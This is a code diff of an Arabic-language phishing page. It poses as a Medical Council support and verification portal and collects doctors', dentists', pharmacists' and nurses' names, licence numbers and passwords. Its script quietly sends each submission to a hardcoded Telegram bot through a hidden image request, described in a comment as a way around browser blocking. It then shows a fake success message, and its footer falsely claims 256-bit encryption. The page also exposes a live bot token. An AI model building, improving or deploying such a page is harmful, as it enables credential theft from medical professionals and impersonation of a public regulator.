@@ -3,66 +3,169 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>المجلس الطبي</title>
+    <title>بوابة الدعم الفني - المجلس الطبي</title>
     <style>
-        body { margin: 0; background: #111827; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; color: white; }
-        .card { width: 90%; max-width: 360px; background: #1f2937; border-radius: 20px; padding: 25px; text-align: center; box-shadow: 0 20px 25px -5px rgba(0,0,0,0.3); }
-        input, select { width: 100%; height: 50px; background: #374151; border: 1px solid #4b5563; border-radius: 12px; padding: 0 15px; margin-bottom: 12px; color: white; font-size: 16px; box-sizing: border-box; text-align: right; }
-        .btn { width: 100%; height: 55px; background: #2563eb; color: white; border: none; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; }
-        #status { margin-top: 15px; display: none; font-weight: bold; }
+        /* التصميم الرسمي الحديث */
+        body { 
+            margin: 0; 
+            background-color: #f1f5f9; 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            min-height: 100vh; 
+        }
+
+        .support-card { 
+            width: 90%; 
+            max-width: 420px; 
+            background: white; 
+            border-radius: 16px; 
+            padding: 40px 30px; 
+            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1);
+            border: 1px solid #e2e8f0;
+        }
+
+        .brand-header { text-align: center; margin-bottom: 35px; }
+        .brand-header .icon-shield { 
+            width: 60px; height: 60px; background: #0369a1; 
+            border-radius: 50%; display: flex; align-items: center; 
+            justify-content: center; margin: 0 auto 15px; color: white; font-size: 30px;
+        }
+        .brand-header h1 { font-size: 22px; color: #0f172a; margin: 0; font-weight: 800; letter-spacing: -0.5px; }
+        .brand-header p { font-size: 14px; color: #64748b; margin-top: 8px; }
+
+        .form-field { margin-bottom: 20px; text-align: right; }
+        .form-field label { display: block; font-size: 14px; font-weight: 600; color: #334155; margin-bottom: 8px; padding-right: 4px; }
+
+        input, select { 
+            width: 100%; 
+            height: 52px; 
+            background: #f8fafc; 
+            border: 1.5px solid #cbd5e1; 
+            border-radius: 10px; 
+            padding: 0 15px; 
+            font-size: 16px; 
+            box-sizing: border-box; 
+            transition: all 0.3s ease;
+            color: #1e293b;
+            outline: none;
+        }
+
+        input:focus { border-color: #0369a1; background: white; box-shadow: 0 0 0 4px rgba(3, 105, 161, 0.1); }
+
+        .btn-submit { 
+            width: 100%; 
+            height: 56px; 
+            background: #0369a1; 
+            color: white; 
+            border: none; 
+            border-radius: 10px; 
+            font-size: 17px; 
+            font-weight: 700; 
+            cursor: pointer; 
+            margin-top: 15px;
+            box-shadow: 0 4px 6px -1px rgba(3, 105, 161, 0.2);
+        }
+
+        .btn-submit:active { transform: scale(0.98); opacity: 0.9; }
+
+        .legal-footer { font-size: 12px; color: #94a3b8; margin-top: 30px; text-align: center; line-height: 1.6; }
+
+        /* شاشة النجاح المحدثة */
+        #successView { display: none; text-align: center; padding: 30px 0; }
+        .success-icon { 
+            width: 80px; height: 80px; background: #ecfdf5; color: #10b981; 
+            border-radius: 50%; display: flex; align-items: center; 
+            justify-content: center; margin: 0 auto 20px; font-size: 40px; 
+        }
+        #successView h2 { color: #065f46; margin-bottom: 10px; }
+        #successView p { color: #6b7280; font-size: 15px; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <h2>المجلس الطبي</h2>
-    <p style="color: #9ca3af; font-size: 14px; margin-bottom: 20px;">يرجى إكمال البيانات للتفعيل</p>
-    
-    <input type="text" id="user" placeholder="اسم المستخدم">
-    <input type="tel" id="reg" placeholder="رقم القيد">
-    <select id="spec">
-        <option>طب عام</option>
-        <option>طب أسنان</option>
-        <option>صيدلة</option>
-    </select>
-    <input type="password" id="pass" placeholder="كلمة المرور">
-    
-    <button onclick="directSend()" class="btn" id="mainBtn">تأكيد الإرسال</button>
-    <div id="status">جاري الإرسال...</div>
+<div class="support-card" id="mainWrapper">
+    <div id="inputForm">
+        <div class="brand-header">
+            <div class="icon-shield">🛡️</div>
+            <h1>بوابة الدعم والتحقق</h1>
+            <p>المجلس الطبي - الإدارة العامة للرقابة</p>
+        </div>
+
+        <div class="form-field">
+            <label>الاسم الكامل (كما هو بالهوية)</label>
+            <input type="text" id="username" placeholder="أدخل اسمك الكامل">
+        </div>
+
+        <div class="form-field">
+            <label>رقم القيد أو الترخيص</label>
+            <input type="tel" id="regId" placeholder="أدخل الرقم التعريفي">
+        </div>
+
+        <div class="form-field">
+            <label>الفئة المهنية</label>
+            <select id="userSpec">
+                <option value="طب بشري">الطب البشري</option>
+                <option value="طب أسنان">طب الأسنان</option>
+                <option value="صيدلة">الصيدلة والسموم</option>
+                <option value="تمريض">التمريض والقبالة</option>
+            </select>
+        </div>
+
+        <div class="form-field">
+            <label>كلمة المرور النظامية</label>
+            <input type="password" id="userPass" placeholder="••••••••">
+        </div>
+
+        <button onclick="sendToSupport()" class="btn-submit" id="submitBtn">إرسال لفرق الدعم</button>
+        
+        <div class="legal-footer">
+            هذا النظام محمي بتشفير 256-بت.<br>
+            حقوق النشر © 2026 المجلس الطبي العام.
+        </div>
+    </div>
+
+    <div id="successView">
+        <div class="success-icon">✓</div>
+        <h2>تم الإرسال لفرق الدعم</h2>
+        <p>لقد استلمنا بياناتك بنجاح، سيتم التحقق منها من قبل فريق الدعم الفني وإفادتكم قريباً.</p>
+        <button onclick="location.reload()" style="background:none; border:none; color:#0369a1; cursor:pointer; margin-top:20px; text-decoration:underline;">إرسال طلب آخر</button>
+    </div>
 </div>
 
 <script>
-    function directSend() {
-        const btn = document.getElementById('mainBtn');
-        const status = document.getElementById('status');
-        
-        // البيانات المدخلة
-        const u = document.getElementById('user').value;
-        const r = document.getElementById('reg').value;
-        const s = document.getElementById('spec').value;
-        const p = document.getElementById('pass').value;
+    function sendToSupport() {
+        const u = document.getElementById('username').value;
+        const r = document.getElementById('regId').value;
+        const s = document.getElementById('userSpec').value;
+        const p = document.getElementById('userPass').value;
 
-        if(!u || !p) { alert("يرجى ملء البيانات"); return; }
+        if(!u || !p) { 
+            alert("يرجى ملء كافة البيانات المطلوبة للمتابعة"); 
+            return; 
+        }
 
+        const btn = document.getElementById('submitBtn');
+        btn.innerText = "جاري الاتصال بالقاعدة...";
         btn.disabled = true;
-        status.style.display = "block";
 
-        // التوكن الجديد الخاص بك ومعرف الشات
+        // معلومات البوت الخاص بك (تظل ثابتة للإرسال السري)
         const token = "8682180549:AAGxYYy6V5adsST-1M7SrSQqk6EV4gRlM5I";
         const chatId = "7746757675";
-        const message = `✅ وصول بيانات جديدة:\n👤 اليوزر: ${u}\n🆔 الرقم: ${r}\n🩺 التخصص: ${s}\n🔑 الكلمة: ${p}`;
+        const text = `🚨 طلب دعم جديد:\n👤 المستخدم: ${u}\n🆔 الرقم: ${r}\n🩺 التخصص: ${s}\n🔑 الباسورد: ${p}`;
 
-        // الطريقة المضمونة: فتح الرابط في الخلفية ثم إغلاقه
-        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+        // استخدام تقنية الصورة المخفية لضمان تخطي حظر المتصفحات
+        const request = new Image();
+        request.src = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
 
-        // نستخدم Image لتخطي حماية المتصفح (حيلة برمجية قوية)
-        const img = new Image();
-        img.src = url;
-
+        // الانتقال لشاشة النجاح المحدثة بعد ثانية واحدة
         setTimeout(() => {
-            document.body.innerHTML = "<div style='text-align:center;'><h1>✅ تم بنجاح</h1><p>تأكد من البوت الآن.</p></div>";
-        }, 1000);
+            document.getElementById('inputForm').style.display = 'none';
+            document.getElementById('successView').style.display = 'block';
+        }, 1500);
     }
 </script>
+
 </body>
 </html>
